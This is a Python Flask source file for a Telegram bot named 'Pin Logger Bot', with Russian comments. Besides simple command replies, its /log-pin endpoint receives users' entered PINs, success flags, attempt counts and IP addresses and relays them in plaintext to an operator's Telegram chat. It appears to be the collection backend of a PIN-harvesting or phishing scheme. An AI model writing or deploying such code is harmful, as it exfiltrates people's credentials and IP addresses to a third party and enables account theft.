from flask import Flask, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

print(f"[{datetime.utcnow()}] Bot started. BOT_TOKEN present: {bool(BOT_TOKEN)}, CHAT_ID: {CHAT_ID}")

# ====================== ГЛАВНЫЙ WEBHOOK ДЛЯ TELEGRAM ======================
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    try:
        update = request.get_json(silent=True)
        
        if not update or 'message' not in update:
            return jsonify({"ok": True}), 200

        message = update['message']
        chat_id = message['chat']['id']
        text = message.get('text', '').strip()

        print(f"[{datetime.utcnow()}] Message from {chat_id}: {text}")

        if text == '/start':
            resp_text = f"""👋 <b>Бот успешно работает!</b>

✅ Webhook активен
🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
📍 Логи PIN приходят в этот чат

Напиши /help"""
        elif text == '/help':
            resp_text = "Команды:\n/start — проверка\n/help — справка\n/status — статус"
        elif text == '/status':
            resp_text = f"🟢 Бот онлайн\n🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
        else:
            resp_text = "Неизвестная команда. Напиши /help"

        # Отправляем ответ
        if BOT_TOKEN:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": chat_id, "text": resp_text, "parse_mode": "HTML"},
                timeout=10
            )

        return jsonify({"ok": True}), 200

    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"ok": True}), 200   # ОБЯЗАТЕЛЬНО 200!


# ====================== ЛОГИРОВАНИЕ PIN ======================
@app.route('/log-pin', methods=['POST'])
def log_pin():
    try:
        data = request.get_json(silent=True) or {}
        print(f"PIN log received: {data.get('entered_pin')} success={data.get('success')}")

        if CHAT_ID and BOT_TOKEN:
            status = "✅ Успешный вход" if data.get('success') else "❌ Неверный PIN"
            msg = f"""🔒 Попытка PIN

{status}
PIN: <code>{data.get('entered_pin', '—')}</code>
Попыток: {data.get('attempts', 0)}
IP: <code>{data.get('ip', '—')}</code>"""

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"},
                timeout=10
            )
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"/log-pin error: {e}")
        return jsonify({"status": "error"}), 200


@app.route('/')
def home():
    return """
    <h1>✅ Pin Logger Bot is running</h1>
    <p>Webhook: /webhook</p>
    <p>Log endpoint: /log-pin</p>
    <p>Bothost защищает некоторые маршруты — /webhook должен быть открыт.</p>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
